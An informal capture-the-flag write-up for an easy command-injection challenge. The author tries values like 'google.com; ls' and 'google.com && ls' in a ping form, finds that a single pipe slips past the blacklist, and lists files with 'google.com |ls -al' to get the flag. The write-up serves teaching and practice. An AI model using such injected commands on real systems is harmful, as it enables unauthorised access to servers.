Challenge 044 : Command Injection Easy

A simple web page that pings and tells you the information abt the web server.
google.com  :  gives the result as such
fb.com : gives the result like 200  OK or 301 redirect
and other information too lot of information 

let's try something else
ls 
whoami 

google.com; ls
google.com && ls
doesnt' work all filtered

let's try
google.com || ls  .. this too filtered

kk the blacklist is provided to you.. so you know the symbols that are blocked.. like ; & | are blocked 
 || --> ''  

 and '| ' --> '' 
 aah.. there's no filter for '|'
 
let's tryy google.com |ls -al 
and boom u're able to get all the files in the directory

cat the EPL.txt and enter it on the login page

Hope You enjoyed it !!!
